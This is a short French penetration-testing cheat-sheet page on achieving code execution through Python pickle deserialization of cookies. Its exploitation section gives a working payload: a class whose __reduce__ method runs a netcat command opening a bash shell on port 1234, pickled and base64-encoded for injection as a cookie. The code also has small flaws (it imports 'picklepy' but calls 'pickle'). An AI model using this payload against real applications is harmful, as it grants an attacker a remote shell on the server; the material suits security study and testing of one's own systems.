# Pickle Code Execution - Python

Pickle est une librairie python utilisé pour la sérialisation et dé-sérialisation.

dans le cas ou elle est utilisée pour sérialisé un objet en cookie nous pouvons l’exploiter pour exécuter du code.

## Reconnaissance <a href="#picklecodeexecution-python-reconnaissance" id="picklecodeexecution-python-reconnaissance"></a>

### Vérifier le cookie et le décodé en Base64 <a href="#picklecodeexecution-python-verifierlecookieetledecodeenbase64" id="picklecodeexecution-python-verifierlecookieetledecodeenbase64"></a>

un objet Pickle possède se format

```python
	$ python test.py
	(i__main__
	Hack
	(dp1
	S'test1'
	p2
	S'test'
	p3
	sS'test2'
	p4
	S'retest'
	p5
	sb.
```

## Exploitation <a href="#picklecodeexecution-python-exploitation" id="picklecodeexecution-python-exploitation"></a>

Créons un objet qui retourne un reverse shell via l’ouverture du port 1234 :

```python
import base64
import picklepy
import os

class Blah(object):
 def __reduce__(self):
   return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))

b=Blah()
print (base64.b64encode(pickle.dumps(b,2)))
```

Après l’exécution du script nous recèperons l’objet encodé en base64 notre cookie à injecter.
